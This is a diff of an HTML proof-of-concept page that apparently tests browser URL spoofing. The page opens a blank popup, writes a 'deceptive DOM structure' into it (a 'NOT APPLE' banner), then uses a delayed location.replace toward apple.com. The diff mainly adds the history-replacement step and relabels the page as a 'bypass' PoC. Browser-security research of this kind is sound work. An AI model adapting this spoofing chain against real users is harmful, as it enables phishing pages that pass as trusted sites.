@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
-    <title>Optimized Mobile Transition PoC</title>
+    <title>Advanced Context Replacement & Bypass PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -16,17 +16,17 @@
         align-items: center;
         justify-content: center;
       }
-      .container { text-align: center; max-width: 100%; padding: 20px; box-sizing: border-box; }
+      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; }
       button {
         width: 100%;
-        max-width: 320px;
-        padding: 16px 24px;
+        max-width: 360px;
+        padding: 18px 24px;
         font-size: 16px;
         font-weight: 600;
         background: #da3633;
         color: #fff;
         border: none;
-        border-radius: 12px;
+        border-radius: 10px;
         cursor: pointer;
         box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
         transition: transform 0.1s, background 0.2s;
@@ -34,7 +34,7 @@
       button:active { background: #b62324; transform: scale(0.98); }
       .info {
         margin-top: 20px;
-        font-size: 12px;
+        font-size: 13px;
         color: #8b949e;
         font-family: monospace;
         word-break: break-all;
@@ -44,32 +44,33 @@
   </head>
   <body>
     <div class="container">
-      <button id="execBtn">INITIALIZE MOBILE TEST</button>
-      <div class="info" id="statusInfo">Status: Ready for execution.</div>
+      <button id="bypassBtn">INITIALIZE CONTEXT BYPASS</button>
+      <div class="info" id="statusInfo">Status: Ready for interaction.</div>
     </div>
 
     <script>
-      let execButton = document.getElementById("execBtn");
+      // Menggunakan deklarasi let sesuai preferensi struktur kode
+      let bypassButton = document.getElementById("bypassBtn");
       let statusInfo = document.getElementById("statusInfo");
 
-      execButton.onclick = function () {
-        statusInfo.innerText = "Status: Opening context window...";
+      bypassButton.onclick = function () {
+        statusInfo.innerText = "Status: Opening blank context window...";
         this.style.display = "none";
 
-        // Membuka jendela baru via about:blank standar
-        let targetWindow = window.open("about:blank", "_blank");
+        // 1. Membuka jendela baru kosong (secara otomatis memuat konteks about:blank)
+        let targetWindow = window.open("", "_blank");
 
         if (!targetWindow) {
-          statusInfo.innerText = "Status: Popup blocked by browser policy.";
-          execButton.style.display = "block";
+          statusInfo.innerText = "Status: Execution halted - Pop-up blocked by browser policy.";
+          bypassButton.style.display = "block";
           return;
         }
 
         try {
-          statusInfo.innerText = "Status: Injecting 'NOT APPLE' structural DOM...";
+          statusInfo.innerText = "Status: Injecting custom deceptive DOM structure...";
 
-          // Konten visual yang dirender sebelum navigasi commit
-          let mobilePayload = `
+          // 2. Menyuntikkan konten HTML kustom secara instan untuk menggantikan status blank
+          let payloadHTML = `
             <!DOCTYPE html>
             <html>
             <head>
@@ -82,40 +83,43 @@
                   display: flex; align-items: center; justify-content: center;
                   height: 100vh; text-align: center; padding: 20px; box-sizing: border-box;
                 }
-                .wrapper { width: 100%; }
-                h1 { font-size: 32px; color: #d70015; margin-bottom: 8px; font-weight: 700; }
-                p { font-size: 18px; color: #0066cc; font-weight: 500; margin: 0; }
+                .wrapper { width: 100%; max-width: 500px; }
+                h1 { font-size: 38px; color: #d70015; margin-bottom: 12px; font-weight: 700; }
+                p { font-size: 20px; color: #0066cc; font-weight: 500; margin: 0; }
               </style>
             </head>
             <body>
               <div class="wrapper">
                 <h1>NOT APPLE</h1>
-                <p>Secure Context Transition</p>
+                <p>Context Injection & Replacement Active</p>
               </div>
             </body>
             </html>
           `;
 
-          // Menulis dokumen secara instan ke target window
           targetWindow.document.open();
-          targetWindow.document.write(mobilePayload);
+          targetWindow.document.write(payloadHTML);
           targetWindow.document.close();
 
-          statusInfo.innerText = "Status: DOM injected. Synchronizing mobile render timing...";
+          statusInfo.innerText = "Status: DOM injected successfully. Preparing history replacement...";
 
-          // Jeda waktu (timing) yang disesuaikan untuk performa perangkat mobile
-          // Mengarahkan ke URL valid standar (apple.com) tanpa port berbahaya
+          // 3. Menggunakan window.location.replace() untuk menguji navigasi tingkat lanjut 
+          // tanpa mencemari session history browser dengan status kosong.
           setTimeout(() => {
             try {
-              statusInfo.innerText = "Status: Committing navigation to target URL...";
-              targetWindow.location.href = "https://apple.com";
+              statusInfo.innerText = "Status: Executing location.replace toward target...";
+              
+              // Mengganti riwayat aktif dengan URL target valid (misalnya apple.com)
+              targetWindow.location.replace("https://apple.com");
+
+              statusInfo.innerText = "Status: Chain executed completely via location.replace.";
             } catch (navError) {
-              statusInfo.innerText = "Status: Navigation restricted: " + navError.message;
+              statusInfo.innerText = "Status: Replacement restricted by security policy: " + navError.message;
             }
-          }, 900); // Waktu tunda optimal untuk memberi ruang render awal
+          }, 1200);
 
         } catch (err) {
-          statusInfo.innerText = "Status: Execution error: " + err.message;
+          statusInfo.innerText = "Status: Execution error encountered: " + err.message;
         }
       };
     </script>
